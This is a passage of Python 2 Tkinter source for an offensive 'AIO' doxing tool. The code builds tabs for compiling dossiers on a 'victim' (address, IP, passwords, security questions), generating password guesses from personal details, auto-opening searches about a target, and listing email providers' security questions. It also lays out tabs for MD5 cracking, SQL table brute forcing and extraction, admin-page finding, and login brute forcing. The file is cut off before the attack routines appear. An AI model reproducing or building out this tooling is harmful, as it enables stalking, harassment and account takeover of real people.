import time
from Tkinter import *
import sys
import os
import urllib
import urllib2
import re
import webbrowser
import tkMessageBox
import datetime
import hashlib
import random
from notebook import *
from tkFileDialog import *
print ("Hello welcome to Preistpower's AIO Tool! ")
print (" ")

time.sleep(1)


class Doxx:

	def __init__(self, master):

		  self.w = Label(text="  Clocwork/Preistpower' doxing tool  ",bg="white", fg="blue", font=("Ariel",12))
		  self.w.pack(fill=BOTH, expand=YES)
		  #############################
		  # This is what adds the tabs#
		  #############################
		  nb = notebook(root, TOP)

		  fl = Frame(nb( ))

		  Saveframe = Frame(nb( ))
		  Passframe = Frame(nb( ))
		  Creditframe = Frame(nb( ))
		  Piplframe = Frame(nb( ))
		  Googleframe = Frame(nb( ))
		  Md5frame = Frame(nb( ))
		  Consoleframe = Frame(nb( ))
		  Sqlframe = Frame(nb( ))
		  Bruteframe = Frame(nb( ))


		  #########################################
		  # This is defining the names of the tabs#
		  #########################################
		  nb.add_screen(Saveframe, "Store Dox")
		  nb.add_screen(Passframe, "Generate Passwords")
		  nb.add_screen(Piplframe,"Dox!(Pipl)")
		  nb.add_screen(Googleframe, "Dox!(Google)")
		  nb.add_screen(Md5frame, "Md5 Cracker")
		  nb.add_screen(Consoleframe,"Console Dox")
		  nb.add_screen(Sqlframe,"Sql Tools")
		  nb.add_screen(Bruteframe,"HTML Bruteforcer")
		  nb.add_screen(Creditframe,"Credits.")










		  ###########################
		  # This is the Save Dox Tab#
		  ###########################

		  self.namelabel = LabelFrame(Saveframe, text="Enter your victims first name:  ", bg="white", fg="blue")
		  self.namelabel.pack(expand=YES, fill=BOTH)

		  self.first = Entry(self.namelabel, bg="White")
		  self.first.pack(expand=YES, fill=BOTH)

		  self.lastlabel = LabelFrame(Saveframe, text="Enter your victims last name: ", bg="white", fg="blue")
		  self.lastlabel.pack(expand=YES, fill=BOTH,)

		  self.last = Entry(self.lastlabel,bg="White")
		  self.last.pack(expand=YES, fill=BOTH)

		  self.userlabel = LabelFrame(Saveframe, text="Enter your victims username: ", bg="white", fg="blue")
		  self.userlabel.pack(expand=YES, fill=BOTH)

		  self.user = Entry(self.userlabel, bg="White")
		  self.user.pack(expand=YES, fill=BOTH)

		  self.emaillabel = LabelFrame(Saveframe, text="Enter your victims email: ", bg="white", fg="blue")
		  self.emaillabel.pack(expand=YES, fill=BOTH)

		  self.email = Entry(self.emaillabel, bg="White")
		  self.email.pack(expand=YES, fill=BOTH)

		  self.altlabel = LabelFrame(Saveframe, text="Enter your victims alternative email or email without @.com: ", bg="white", fg="blue")
		  self.altlabel.pack(expand=YES, fill=BOTH)

		  self.altemail = Entry(self.altlabel, bg="White")
		  self.altemail.pack(expand=YES, fill=BOTH)

		  self.weblabel = LabelFrame(Saveframe, text="Enter your victims main website: ", bg="white", fg="blue")
		  self.weblabel.pack(expand=YES, fill=BOTH)

		  self.webs = Entry(self.weblabel, bg="White")
		  self.webs.pack(expand=YES, fill=BOTH)

		  self.sweblabel = LabelFrame(Saveframe, text="Enter your victims second most used website: ", bg="white", fg="blue")
		  self.sweblabel.pack(expand=YES, fill=BOTH)

		  self.sweb = Entry(self.sweblabel, bg="White")
		  self.sweb.pack(expand=YES, fill=BOTH)

		  self.photolabel = LabelFrame(Saveframe, text="Enter a link to your victims photos: ", bg="white", fg="blue")
		  self.photolabel.pack(expand=YES, fill=BOTH)

		  self.photo = Entry(self.photolabel, bg="White")
		  self.photo.pack(expand=YES, fill=BOTH)

		  self.iplabel = LabelFrame(Saveframe, text="Enter your victims I.P Address or type N/A: ", bg="white", fg="blue")
		  self.iplabel.pack(expand=YES, fill=BOTH)

		  self.ip = Entry(self.iplabel, bg="White")
		  self.ip.pack(expand=YES, fill=BOTH)

		  self.addrlabel = LabelFrame(Saveframe, text="Enter your victims address: ", bg="white", fg="blue")
		  self.addrlabel.pack(expand=YES, fill=BOTH)

		  self.address = Entry(self.addrlabel, bg="White")
		  self.address.pack(expand=YES, fill=BOTH)

##		  self.famlabel = LabelFrame(Saveframe, text="Enter your victims family: ", bg="white", fg="blue")
##		  self.famlabel.pack(expand=YES, fill=BOTH)
##
##		  self.family = Entry(self.famlabel, bg="White")
##		  self.family.pack(expand=YES, fill=BOTH)

		  self.schoollabel = LabelFrame(Saveframe, text="Enter your victims school or employer", bg="white", fg="blue")
		  self.schoollabel.pack(expand=YES, fill=BOTH)

		  self.school = Entry(self.schoollabel, bg="White")
		  self.school.pack(expand=YES, fill=BOTH)

		  self.numberlabel = LabelFrame(Saveframe, text="Enter your victims phone number without dashes!: ", bg="white", fg="blue")
		  self.numberlabel.pack(expand=YES, fill=BOTH )

		  self.phone = Entry(self.numberlabel, bg="White")
		  self.phone.pack(expand=YES, fill=BOTH)

		  self.questlabel = LabelFrame(Saveframe, text="Enter your victims security questions: ", bg="white", fg="blue")
		  self.questlabel.pack(expand=YES, fill=BOTH)

		  self.quest = Entry(self.questlabel, bg="White")
		  self.quest.pack(expand=YES, fill=BOTH)


		  self.passw = LabelFrame(Saveframe, text= "Enter your victims used passwords or type N/A: ", bg="white", fg="blue")
		  self.passw.pack(expand=YES, fill=BOTH)

		  self.password = Entry(self.passw, bg="White")
		  self.password.pack(expand=YES, fill=BOTH)

		  self.birthlabel = LabelFrame(Saveframe, text= " Enter your victims Birthdate: ", bg="white", fg="blue")
		  self.birthlabel.pack(expand=YES, fill=BOTH)

		  self.birth = Entry(self.birthlabel, bg="White")
		  self.birth.pack(expand=YES, fill=BOTH)


		  self.otherlabel = LabelFrame(Saveframe, text=" Any other information? ", bg="white", fg="blue")
		  self.otherlabel.pack(expand=YES, fill=BOTH)

		  self.other = Entry(self.otherlabel, bg="White")
		  self.other.pack(expand=YES, fill=BOTH)

		  self.savedox = Button(Saveframe, text="Store Your Dox", fg="blue", bg="white", command=self.save_file)
		  self.savedox.pack(expand=YES, fill=BOTH, side=LEFT)

		  ########################################
		  # This is the Password Generator Table.#
		  ########################################

		  self.namelabel = LabelFrame(Passframe, text="Enter your victims firstname: ", bg="white", fg="blue")
		  self.namelabel.pack(expand=YES, fill=BOTH)

		  self.name = Entry(self.namelabel, bg="White")
		  self.name.pack(expand=YES, fill=BOTH)

		  self.lastlabel = LabelFrame(Passframe, text="Enter your victims lastname: ", bg="White", fg="blue")
		  self.lastlabel.pack(expand=YES, fill=BOTH)

		  self.lname = Entry(self.lastlabel, bg="White")
		  self.lname.pack(expand=YES, fill=BOTH)

		  self.monthnlabel = LabelFrame(Passframe, text="Enter your victims month of birth in numbers: ", bg="White", fg="blue")
		  self.monthnlabel.pack(expand=YES, fill=BOTH)

		  self.monthn = Entry(self.monthnlabel, bg="White")
		  self.monthn.pack(expand=YES, fill=BOTH)

		  self.monthllabel = LabelFrame(Passframe, text="Enter your victims month of birth's first three letters ex. jan or feb: ", bg="WHite", fg="Blue")
		  self.monthllabel.pack(expand=YES, fill=BOTH)

		  self.monthl = Entry(self.monthllabel, bg="White")
		  self.monthl.pack(expand=YES, fill=BOTH)

		  self.dayslabel = LabelFrame(Passframe, text="Enter your victims day of birth in numbers like ", bg="White", fg="Blue")
		  self.dayslabel.pack(expand=YES, fill=BOTH)

		  self.days = Entry(self.dayslabel, bg="White")
		  self.days.pack(expand=YES, fill=BOTH)

		  self.yearlabel = LabelFrame(Passframe, text="Enter your victims year of birth ex. 1800 ", bg="White", fg="Blue")
		  self.yearlabel.pack(expand=YES, fill=BOTH)

		  self.year = Entry(self.yearlabel, bg="White")
		  self.year.pack(expand=YES, fill=BOTH)

		  self.yeartlabel = LabelFrame(Passframe, text="Enter the last two digits of your victims birth year: ", bg="White", fg="Blue")
		  self.yeartlabel.pack(expand=YES, fill=BOTH)

		  self.yeart = Entry(self.yeartlabel, bg="White")
		  self.yeart.pack(expand=YES, fill=BOTH)

		  self.emailabel = LabelFrame(Passframe, text="Enter your victims Username or email address without @.com: ", bg="White", fg="blue")
		  self.emailabel.pack(expand=YES, fill=BOTH)

		  self.email = Entry(self.emailabel, bg="White")
		  self.email.pack(expand=YES, fill=BOTH)

		  self.otherlabel = LabelFrame(Passframe, text="Enter the name of your victims significant other: ", bg="White", fg="blue")
		  self.otherlabel.pack(expand=YES, fill=BOTH)

		  self.other = Entry(self.otherlabel, bg="white")
		  self.other.pack(expand=YES, fill=BOTH)

		  self.phonelabel = LabelFrame(Passframe, text="Enter your victims phone number without dashes!: ", bg="White", fg="Blue")
		  self.phonelabel.pack(expand=YES, fill=BOTH)

		  self.phone = Entry(self.phonelabel, bg="White")
		  self.phone.pack(expand=YES, fill=BOTH)

		  self.petlabel = LabelFrame(Passframe, text="Enter your victims pets' name: ", bg="White", fg="Blue")
		  self.petlabel.pack(expand=YES, fill=BOTH)

		  self.pet = Entry(self.petlabel, bg="White")
		  self.pet.pack(expand=YES, fill=BOTH)

		  self.tvlabel = LabelFrame(Passframe, text="Enter the name of your victims favorite t.v show or movie: ", bg="White", fg="Blue")
		  self.tvlabel.pack(expand=YES, fill=BOTH)

		  self.tv = Entry(self.tvlabel, bg="White")
		  self.tv.pack(expand=YES, fill=BOTH)

		  self.sportlabel = LabelFrame(Passframe, text="Enter the name of your victims favorite sport: ", bg="White", fg="Blue")
		  self.sportlabel.pack(expand=YES, fill=BOTH)

		  self.sport = Entry(self.sportlabel, bg="White")
		  self.sport.pack(expand=YES, fill=BOTH)

		  self.booklabel = LabelFrame(Passframe, text="Enter the name of your victims favorite book/Author: ", bg="White", fg="Blue")
		  self.booklabel.pack(expand=YES, fill=BOTH)

		  self.book = Entry(self.booklabel, bg="White")
		  self.book.pack(expand=YES, fill=BOTH)

		  self.ziplabel = LabelFrame(Passframe, text="Enter your victims Zip code, street name, or city: ", bg="White", fg="Blue")
		  self.ziplabel.pack(expand=YES, fill=BOTH)

		  self.zip = Entry(self.ziplabel, bg="White")
		  self.zip.pack(expand=YES, fill=BOTH)

		  self.passgen = Button(Passframe, text="Generate Passwords!", fg="Blue", bg="White", command=self.gen_pass)
		  self.passgen.pack(expand=YES, fill=BOTH, side=LEFT)

		  ################################
		  # I am defining the Credits Tab#
		  ################################
		  self.ww = Label(Creditframe, text="If you have comments/suggestions, email preistpower@hotmail.com.")
		  self.ww.pack(expand=YES, fill=BOTH)

		  self.w2 = Label(Creditframe, text=" ")
		  self.w2.pack(expand=YES, fill=BOTH)

		  self.www = Label(Creditframe, text="I can also be reached at Social-Hackers.blogspot.com!")
		  self.www.pack(expand=YES, fill=BOTH)

		  #######################################
		  # This is the design for the Pipl dox #
		  #######################################

		  self.pnamelabel = LabelFrame(Piplframe, text="Enter your victims first name", bg="White", fg="Blue")
		  self.pnamelabel.pack(expand=YES, fill=BOTH)

		  self.pname = Entry(self.pnamelabel, bg="White")
		  self.pname.pack(expand=YES, fill=BOTH)

		  self.plastlabel = LabelFrame(Piplframe, text="Enter your victims last name", bg="White", fg="Blue")
		  self.plastlabel.pack(expand=YES, fill=BOTH)

		  self.plast = Entry(self.plastlabel, bg="White")
		  self.plast.pack(expand=YES, fill=BOTH)

		  self.pemailabel = LabelFrame(Piplframe, text="Enter your victims email address: ", bg="White", fg="Blue")
		  self.pemailabel.pack(expand=YES, fill=BOTH)

		  self.pemail = Entry(self.pemailabel, bg="White")
		  self.pemail.pack(expand=YES, fill=BOTH)

		  self.puserlabel = LabelFrame(Piplframe, text="Enter your victims Username: ", bg="White", fg="blue")
		  self.puserlabel.pack(expand=YES, fill=BOTH)

		  self.puser = Entry(self.puserlabel,bg="White")
		  self.puser.pack(expand=YES, fill=BOTH)

		  self.pphonelabel = LabelFrame(Piplframe, text="Enter your victims phone number: ", bg="White", fg="Blue")
		  self.pphonelabel.pack(expand=YES, fill=BOTH)

		  self.pphone = Entry(self.pphonelabel, bg="white")
		  self.pphone.pack(expand=YES, fill=BOTH)

		  self.piplabel = LabelFrame(Piplframe, text="Enter your victims i.p address: ", bg="White", fg="Blue")
		  self.piplabel.pack(expand=YES, fill=BOTH)

		  self.pip = Entry(self.piplabel, bg="White")
		  self.pip.pack(expand=YES, fill=BOTH)

		  self.pdox = Button(Piplframe, text="Dox your target!", fg="Blue", bg="White", command=self.pipl_dox)
		  self.pdox.pack(expand=YES, fill=BOTH, side=BOTTOM)

		  #########################################
		  # This is the design for the Google Tab #
		  #########################################
		  self.gnamelabel = LabelFrame(Googleframe, text="Enter your victims first name", bg="White", fg="Blue")
		  self.gnamelabel.pack(expand=YES, fill=BOTH)

		  self.gname = Entry(self.gnamelabel, bg="White")
		  self.gname.pack(expand=YES, fill=BOTH)

		  self.glastlabel = LabelFrame(Googleframe, text="Enter your victims last name", bg="White", fg="Blue")
		  self.glastlabel.pack(expand=YES, fill=BOTH)

		  self.glast = Entry(self.glastlabel, bg="White")
		  self.glast.pack(expand=YES, fill=BOTH)

		  self.gemailabel = LabelFrame(Googleframe, text="Enter your victims email address: ", bg="White", fg="Blue")
		  self.gemailabel.pack(expand=YES, fill=BOTH)

		  self.gemail = Entry(self.gemailabel, bg="White")
		  self.gemail.pack(expand=YES, fill=BOTH)

		  self.guserlabel = LabelFrame(Googleframe, text="Enter your victims Username: ", bg="White", fg="blue")
		  self.guserlabel.pack(expand=YES, fill=BOTH)

		  self.guser = Entry(self.guserlabel,bg="White")
		  self.guser.pack(expand=YES, fill=BOTH)

		  self.gphonelabel = LabelFrame(Googleframe, text="Enter your victims phone number: ", bg="White", fg="Blue")
		  self.gphonelabel.pack(expand=YES, fill=BOTH)

		  self.gphone = Entry(self.gphonelabel, bg="white")
		  self.gphone.pack(expand=YES, fill=BOTH)

		  self.giplabel = LabelFrame(Googleframe, text="Enter your victims i.p address: ", bg="White", fg="Blue")
		  self.giplabel.pack(expand=YES, fill=BOTH)

		  self.gip = Entry(self.giplabel, bg="White")
		  self.gip.pack(expand=YES, fill=BOTH)

		  self.sdox = Button(Googleframe, text="Dox your target!", fg="Blue", bg="White", command=self.google_doxs)
		  self.sdox.pack(expand=YES, fill=BOTH, side=BOTTOM)

		  ######################
		  # The md5 tabs design#
		  ######################
		  self.hashlabel = LabelFrame(Md5frame, text="Enter your hash: ", bg="White", fg="Blue")
		  self.hashlabel.pack(expand=YES, fill=BOTH)

		  self.hash = Entry(self.hashlabel, bg="White")
		  self.hash.pack(expand=YES, fill=BOTH)

		  self.brute = Button(Md5frame, text="Brute Force It.", fg="Blue", bg="White", command=self.brute_att)
		  self.brute.pack(expand=YES, fill=BOTH, side=BOTTOM)

		  #############################
		  # Design for the Console Dox#
		  #############################

		  self.ziplabell = LabelFrame(Consoleframe, text="Enter a zip code to see its city and state: ", bg="White", fg="Blue")
		  self.ziplabell.pack(expand=YES, fill=BOTH)

		  self.zip = Entry(self.ziplabell,bg="White")
		  self.zip.pack(expand=YES, fill=BOTH)

		  self.zipbut = Button(Consoleframe,text="Search the zip: ",fg="Blue",bg="White",command=self.zip_search)
		  self.zipbut.pack(expand=YES, fill=BOTH)

		  self.plabel = LabelFrame(Consoleframe, text="Enter the phone number to search ex. 999-999-9999: ", fg="Blue",bg="White",)
		  self.plabel.pack(expand=YES,fill=BOTH)

		  self.ph = Entry(self.plabel,bg="White")
		  self.ph.pack(expand=YES, fill=BOTH)

		  self.phoneb = Button(Consoleframe,text="Search for the number: ",fg="Blue",bg="White",command=self.p_search)
		  self.phoneb.pack(expand=YES,fill=BOTH)


		  ###########################
		  # Design for the Sql Frame#
		  ###########################

		  self.proxlabel = LabelFrame(Sqlframe, text="Enter your proxy to use or leave blank: ", bg="White", fg="Blue")
		  self.proxlabel.pack(expand=YES,fill=BOTH)

		  self.proxies = Entry(self.proxlabel,bg="White")
		  self.proxies.pack(expand=YES, fill=BOTH)

		  self.urllabelb = LabelFrame(Sqlframe,text="Please enter your url, for specific functions please refer to the README.txt: ",bg="White",fg="Blue")
		  self.urllabelb.pack(expand=YES, fill=BOTH)

		  self.urlb = Entry(self.urllabelb,bg="White")
		  self.urlb.pack(expand=YES, fill=BOTH)

		  self.numlabel = LabelFrame(Sqlframe,text="Please enter the amount of columns you would like to extract eg, 5000: ",bg="White",fg="Blue")
		  self.numlabel.pack(expand=YES, fill=BOTH)

		  self.num = Entry(self.numlabel,bg="White")
		  self.num.pack(expand=YES, fill=BOTH)

		  self.outlabel = LabelFrame(Sqlframe,text="Please enter the output file: ", bg="White",fg="Blue")
		  self.outlabel.pack(expand=YES, fill=BOTH)

		  self.outf = Entry(self.outlabel,bg="White")
		  self.outf.pack(expand=YES, fill=BOTH)

		  self.bforce = Button(Sqlframe, text="Brute Force The Tables", fg="Blue", bg="White", command=self.V4_Brute)
		  self.bforce.pack(expand=YES, fill=BOTH, side=BOTTOM)

		  self.adminf = Button(Sqlframe, text="Find the admin page", fg="Blue", bg="White", command=self.find_adminp)
		  self.adminf.pack(expand=YES, fill=BOTH, side=BOTTOM)

		  self.sqlextract = Button(Sqlframe, text="Extract the column data", fg="Blue", bg="White", command=self.sql_data)
		  self.sqlextract.pack(expand=YES, fill=BOTH, side=BOTTOM)

		  ######################
		  #HTML Bruteforcer tab#
		  ######################



		  self.hostlabel = LabelFrame(Bruteframe, text="Please enter the url: ",fg="Blue",bg="White")
		  self.hostlabel.pack(expand=YES,fill=BOTH)

		  self.host = Entry(self.hostlabel,bg="White")
		  self.host.pack(expand=YES,fill=BOTH)


		  self.errorlabel = LabelFrame(Bruteframe, text="Please enter the error message: ", fg="Blue",bg="White")
		  self.errorlabel.pack(expand=YES,fill=BOTH)

		  self.error = Entry(self.errorlabel,bg="White")
		  self.error.pack(expand=YES,fill=BOTH)

		  self.wordfilelabel = LabelFrame(Bruteframe, text="Please enter your user list or password list: ", fg="Blue",bg="White")
		  self.wordfilelabel.pack(expand=YES,fill=BOTH)

		  self.wordfile = Entry(self.wordfilelabel, bg="White")
		  self.wordfile.pack(expand=YES,fill=BOTH)

		  self.useridlabel = LabelFrame(Bruteframe, text="Please enter the user id: ",fg="Blue",bg="White")
		  self.useridlabel.pack(expand=YES,fill=BOTH)

		  self.userid = Entry(self.useridlabel, bg="White")
		  self.userid.pack(expand=YES, fill=BOTH)

		  self.passidlabel = LabelFrame(Bruteframe, text="Please enter the password id: ",fg="Blue",bg="White")
		  self.passidlabel.pack(expand=YES,fill=BOTH)

		  self.passid = Entry(self.passidlabel,bg="White")
		  self.passid.pack(expand=YES,fill=BOTH)

		  self.pass1label = LabelFrame(Bruteframe, text="Please enter the password or username you would like to use",fg="Blue",bg="White")
		  self.pass1label.pack(expand=YES,fill=BOTH)

		  self.pass1 = Entry(self.pass1label, bg="White")
		  self.pass1.pack(expand=YES,fill=BOTH)

		  self.bruteuser = Button(Bruteframe, text="Bruteforce the user list",fg="Blue",bg="White",command=self.user_brute)
		  self.bruteuser.pack(expand=YES,fill=BOTH)

		  self.htmlbrute = Button(Bruteframe, text="Bruteforce the pass list",fg="Blue",bg="White",command=self.html_brute)
		  self.htmlbrute.pack(expand=YES,fill=BOTH)
	def save_file(self):
			#####################################################################################
			#I am assigning the variables to shorten words, to help make my code easier to read.#
			#####################################################################################

			first= self.first.get()
			user = self.user.get()
			last = self.last.get()
			email = self.email.get()
			altemail = self.altemail.get()
			webs = self.webs.get()
			sweb = self.sweb.get()
			photo = self.photo.get()
			ip = self.ip.get()
			address = self.address.get()
##			family = self.family.get()
			phone = self.phone.get()
			quest = self.quest.get()
			password = self.password.get()
			birth = self.birth.get()
			other = self.other.get()
			school = self.school.get()
			########################################################
			# The date1 variable is what timestamps every dox saved#
			########################################################
			date1 = str(datetime.date.today())
			#######################################################
			# This is how the variables write themselves to a file#
			#######################################################
			text_file = asksaveasfile(mode='w', defaultextension=".txt")
			text_file.write("Date Of Dox Creation:  " + date1 + '\n')
			text_file.write(" " + '\n')
			text_file.write("Name: " + first + " " + last +'\n')
			######################################################################
			#The blank spaces are used to neatly make a space in the files format#
			######################################################################
			text_file.write("   " + '\n')
			text_file.write("Username: " + user +  '\n')
			text_file.write("   " + '\n')
			text_file.write("Email: " + email +   '\n')
			text_file.write("   " + '\n')
			text_file.write("Alternate email: " + altemail + '\n')
			text_file.write("   " + '\n')
			text_file.write("Main Website: " + webs  + '\n')
			text_file.write("   " + '\n')
			text_file.write("Second Website: " + sweb  + '\n')
			text_file.write("   " + '\n')
			text_file.write("Photos: " + photo  + '\n')
			text_file.write("   " + '\n')
			text_file.write("I.P Address: " + ip + '\n')
			text_file.write("   " + '\n')
			text_file.write("Address: " + address +  '\n')
			text_file.write("   " + '\n')
##			text_file.write("Family: " + family +  '\n')
##			text_file.write("   " + '\n')
			text_file.write("Victim's School:" + school + '\n')
			text_file.write("   " + '\n')
			text_file.write("Phone Number: " + phone + '\n')
			text_file.write("   " + '\n')
			text_file.write("Security Questions: " + quest +  '\n')
			text_file.write("   " + '\n')
			text_file.write("Used Passwords: " + password + '\n')
			text_file.write("   " + '\n')
			text_file.write("Birth Date: " + birth +  '\n')
			text_file.write("   " + '\n')
			text_file.write("Other Info: " + other +  '\n')
			tkMessageBox.showinfo("Dox", "Your dox has been stored")
	def google_doxs(self):


			####################
			## DEFINE STRINGS ##
			####################
			self.firstname = self.gname.get()
			self.lastname = self.glast.get()
			self.emailname = self.gemail.get()
			self.username = self.guser.get()
			self.phonenumber = self.gphone.get()
			self.ipaddress = self.gip.get()

			###########################
			## END OF DEFIND STRINGS ##
			###########################


        ###############################
        ## Google Button's Searches. ##
		###############################

			self.facebooknamesearch = 'http://www.facebook.com/search/?post_form_id=0088687481a6f37a24ea21844faa211c&q=%s %s &init=quick&sid=0.8027556583349791' % (self.firstname, self.lastname)
			self.yellowbooksearch = 'http://www.yellowpages.com/findaperson/phone?fap_terms[phone]=%s&fap_terms[searchtype]=phone' % (self.phonenumber)
			self.googlenamesearch = 'http://www.google.com/#hl=en&q=%s %s' % (self.firstname, self.lastname)
			self.googleemailsearch = 'http://www.google.com/#hl=en&q=%s' % (self.emailname)
			self.googleusersearch = 'http://www.google.com/#hl=en&q=%s' % (self.username)
			self.iplookup = 'http://www.whois.sc/%s' % (self.ipaddress)

        ###############################
		## END OF DIFFERENT SEARCHES ##
		###############################

        ###########################
        ###########################


		################
        ## OBTAIN DOX ##
		################

			if self.firstname == '':
				print "No name search will be done"

			elif self.lastname == '':
				print "No name search will be done"

			else :
				webbrowser.open(self.facebooknamesearch)
				webbrowser.open(self.googlenamesearch)

			if self.emailname == '':
				print "No email search will be done"

			else :
				webbrowser.open(self.googleemailsearch)

			if self.username == '':
				print "No username search will be done"

			else :

				webbrowser.open(self.googleusersearch)

			if self.phonenumber == '':
				print "No phone number search will be done"

			else :

				webbrowser.open(self.yellowbooksearch)

			if self.iplookup == '':
				print "No ip search will be done"

			else :

				webbrowser.open(self.iplookup)

			####################################################
			# Defining the variables for the security questions#
			####################################################
			emailnamf = self.emailname.find("@")
			emailnamee = self.emailname[emailnamf+1:]
			emailnamee = emailnamee.lower()
			######################################################
			# Security questions for many popular email providers#
			######################################################
			if emailnamee == 'yahoo.com':
				print ' '
				print 'Yahoo.com Email Security Questions'
				print ' '
				print ' '
				print 'What is the first name of your favorite uncle?'
				print ' '
				print 'Where did you meet your spouse?'
				print ' '
				print 'What is your oldest cousins name?'
				print ' '
				print 'What is your youngest childs nickname?'
				print ' '
				print 'What is your oldest childs nickname?'
				print ' '
				print 'What is the first name of your oldest niece?'
				print ' '
				print 'What is the first name of your oldest nephew?'
				print ' '
				print 'Where did you spend your honeymoon?'
				print ' '
				print 'Where did you spend your childhood summers?'
				print ' '
				print 'What was the last name of your favorite teacher?'
				print ' '
				print 'What was the last name of your best childhood friend?'
				print ' '
				print 'What was the last name of your first boss?'
				print ' '
				print 'What was your favorite food as a child?'
				print ' '
				print 'What is the name of the hospital were you were born?'
				print ' '
				print 'What is the name of the street which you grew up?'
				print ' '
				print 'What is the name of your favorite sports team?'
				print ' '
				print 'What was your first pets name?'
				print ' '
				print 'What is the name of your favorite book?'
				print ' '
				print 'What is the last name of your favorite musician?'
				print ' '
				print 'who is your all-time favorite movie character'
				print ' '
				print 'What was the make of your first car?'
				print ' '
				print 'What was the make of your first motor cycle?'
				print ' '
				print 'Who is your favorite author?'


			if emailnamee == 'ymail.com':
				print ' '
				print 'Ymail.com Email Security Questions'
				print ' '
				print ' '
				print 'What is the first name of your favorite uncle?'
				print ' '
				print 'Where did you meet your spouse?'
				print ' '
				print 'What is your oldest cousins name?'
				print ' '
				print 'What is your youngest childs nickname?'
				print ' '
				print 'What is your oldest childs nickname?'
				print ' '
				print 'What is the first name of your oldest niece?'
				print ' '
				print 'What is the first name of your oldest nephew?'
				print ' '
				print 'Where did you spend your honeymoon?'
				print ' '
				print 'Where did you spend your childhood summers?'
				print ' '
				print 'What was the last name of your favorite teacher?'
				print ' '
				print 'What was the last name of your best childhood friend?'
				print ' '
				print 'What was the last name of your first boss?'
				print ' '
				print 'What was your favorite food as a child?'
				print ' '
				print 'What is the name of the hospital were you were born?'
				print ' '
				print 'What is the name of the street which you grew up?'
				print ' '
				print 'What is the name of your favorite sports team?'
				print ' '
				print 'What was your first pets name?'
				print ' '
				print 'What is the name of your favorite book?'
				print ' '
				print 'What is the last name of your favorite musician?'
				print ' '
				print 'who is your all-time favorite movie character'
				print ' '
				print 'What was the make of your first car?'
				print ' '
				print 'What was the make of your first motor cycle?'
				print ' '
				print 'Who is your favorite author?'


			if emailnamee == 'rocketmail.com':
				print ' '
				print 'rocketmail(yahoo) Email Security Questions'
				print ' '
				print ' '
				print 'What is the first name of your favorite uncle?'
				print ' '
				print 'Where did you meet your spouse?'
				print ' '
				print 'What is your oldest cousins name?'
				print ' '
				print 'What is your youngest childs nickname?'
				print ' '
				print 'What is your oldest childs nickname?'
				print ' '
				print 'What is the first name of your oldest niece?'
				print ' '
				print 'What is the first name of your oldest nephew?'
				print ' '
				print 'Where did you spend your honeymoon?'
				print ' '
				print 'Where did you spend your childhood summers?'
				print ' '
				print 'What was the last name of your favorite teacher?'
				print ' '
				print 'What was the last name of your best childhood friend?'
				print ' '
				print 'What was the last name of your first boss?'
				print ' '
				print 'What was your favorite food as a child?'
				print ' '
				print 'What is the name of the hospital were you were born?'
				print ' '
				print 'What is the name of the street which you grew up?'
				print ' '
				print 'What is the name of your favorite sports team?'
				print ' '
				print 'What was your first pets name?'
				print ' '
				print 'What is the name of your favorite book?'
				print ' '
				print 'What is the last name of your favorite musician?'
				print ' '
				print 'who is your all-time favorite movie character'
				print ' '
				print 'What was the make of your first car?'
				print ' '
				print 'What was the make of your first motor cycle?'
				print ' '
				print 'Who is your favorite author?'

			if emailnamee == 'hotmail.com':
				print ' '
				print 'Hotmail Security Questions'
				print ' '
				print 'Mothers Birthplace?'
				print ' '
				print 'Best Childhood Friend?'
				print ' '
				print 'Name of First Pet?'
				print ' '
				print 'Favorite Teacher'
				print ' '
				print 'Favorite Historical Person'
				print ' '
				print 'Grandfathers occupation'
				print ' '

			if emailnamee == 'live.com':
				print ' '
				print 'Live(msn) Security Questions'
				print ' '
				print 'Mothers Birthplace?'
				print ' '
				print 'Best Childhood Friend?'
				print ' '
				print 'Name of First Pet?'
				print ' '
				print 'Favorite Teacher'
				print ' '
				print 'Favorite Historical Person'
				print ' '
				print 'Grandfathers occupation'
				print ' '

			if emailnamee == 'msn.com':
				print ' '
				print 'msn Security Questions'
				print ' '
				print 'Mothers Birthplace?'
				print ' '
				print 'Best Childhood Friend?'
				print ' '
				print 'Name of First Pet?'
				print ' '
				print 'Favorite Teacher'
				print ' '
				print 'Favorite Historical Person'
				print ' '
				print 'Grandfathers occupation'
				print ' '

			if emailnamee == 'fbi.gov':
				print ' '
				print 'msn Security Questions'
				print ' '
				print 'Mothers Birthplace?'
				print ' '
				print 'Best Childhood Friend?'
				print ' '
				print 'Name of First Pet?'
				print ' '
				print 'Favorite Teacher'
				print ' '
				print 'Favorite Historical Person'
				print ' '
				print 'Grandfathers occupation'
				print ' '
			if emailnamee == 'gmail.com':
				print ' '
				print 'Gmail Security Questions.'
				print ' '
				print 'What is your primary frequent flyer number?'
				print ' '
				print 'What is your library card number?'
				print ' '
				print 'What was your first phone number?'
				print ' '
				print 'What was your first teachers name?'
				print ' '
			if emailnamee == 'aol.com':
				print ' '
				print 'Aol Security Questions.'
				print ' '
				print 'What is your primary frequent flyer number?'
				print ' '
				print 'What is your library card number?'
				print ' '
				print 'In which city did your parents meet?'
				print ' '
				print 'In what year was your mother born?'
				print ' '
				print 'What was your favorite childhood cartoon?'
				print ' '
				print 'What was your favorite childhood book?'
				print ' '
				print 'In what year was your father born?'
				print ' '
				print 'What was your childhood nickname?'
				print ' '
				print 'What is your grandmothers first name?'
				print ' '
				print 'What is your fathers middle name?'
				print ' '
				print 'In what city were you born?'
				print ' '
				print 'What is your mothers maiden name?'
				print ' '
				print 'What was the name of your first pet?'

			if emailnamee == 'aim.com':
				print ' '
				print 'Aol Security Questions.'
				print ' '
				print 'What is your primary frequent flyer number?'
				print ' '
				print 'What is your library card number?'
				print ' '
				print 'In which city did your parents meet?'
				print ' '
				print 'In what year was your mother born?'
				print ' '
				print 'What was your favorite childhood cartoon?'
				print ' '
				print 'What was your favorite childhood book?'
				print ' '
				print 'In what year was your father born?'
				print ' '
				print 'What was your childhood nickname?'
				print ' '
				print 'What is your grandmothers first name?'
				print ' '
				print 'What is your fathers middle name?'
				print ' '
				print 'In what city were you born?'
				print ' '
				print 'What is your mothers maiden name?'
				print ' '
				print 'What was the name of your first pet?'


	def gen_pass(self):

		######################################
		# Shortening the gen passes variables#
		######################################



			name = self.name.get()
			lname = self.lname.get()
			monthn = self.monthn.get()
			monthl = self.monthl.get()
			days = self.days.get()
			year = self.year.get()
			yeart = self.yeart.get()
			email = self.email.get()
			other = self.other.get()
			phone = self.phone.get()
			pet = self.pet.get()
			tv = self.tv.get()
			sport = self.sport.get()
			book = self.book.get()
			zip = self.zip.get()



			#######################################################
